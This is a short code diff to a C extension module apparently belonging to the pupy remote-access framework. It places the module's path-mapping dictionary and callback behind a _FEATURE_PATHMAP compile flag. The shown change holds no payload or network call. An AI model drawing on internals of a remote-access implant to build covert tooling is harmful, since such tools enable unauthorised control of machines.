@@ -30,6 +30,8 @@
 static const char module_doc[] = DOC("Builtins utilities for pupy");
 
 static PyObject *ExecError;
+
+#ifdef _FEATURE_PATHMAP
 static PyObject *py_pathmap = NULL;
 
 #ifndef _LD_HOOKS_NAME
@@ -75,6 +77,7 @@ const char *__pathmap_callback(const char *path, char *buf, size_t buf_size)
     strncpy(buf, c_result, buf_size);
     return buf;
 }
+#endif
 
 static PyObject *Py_get_arch(PyObject *self, PyObject *args)
 {
@@ -389,15 +392,17 @@ init_pupy(void) {
     Py_INCREF(ExecError);
     PyModule_AddObject(pupy, "error", ExecError);
 
-    py_pathmap = PyDict_New();
-    Py_INCREF(py_pathmap);
-    PyModule_AddObject(pupy, "pathmap", py_pathmap);
-
 #ifdef _PUPY_SO
     setup_jvm_class();
 #endif
 
+#ifdef _FEATURE_PATHMAP
+    py_pathmap = PyDict_New();
+    Py_INCREF(py_pathmap);
+    PyModule_AddObject(pupy, "pathmap", py_pathmap);
+
 #ifndef _LD_HOOKS_NAME
     set_pathmap_callback(__pathmap_callback);
+#endif
 #endif
 }
